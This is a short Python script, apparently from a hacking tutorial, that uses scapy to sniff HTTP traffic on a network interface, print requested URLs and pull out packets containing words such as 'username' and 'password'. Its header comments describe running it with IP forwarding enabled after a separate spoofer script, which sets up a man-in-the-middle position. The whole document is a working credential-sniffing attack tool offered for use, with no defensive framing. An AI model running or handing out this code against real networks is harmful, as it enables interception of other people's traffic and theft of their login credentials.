#!/usr/bin/env python

#How to run:
	#0. run		echo 1 > /proc/sys/net/ipv4/ip_forward
	#1. run 	python spoofer.py
	#2. run 	python sniffer.py


import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "uname"]
        for keyword in keywords:
            if keyword in load:
                return load




def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")



sniff("eth0")
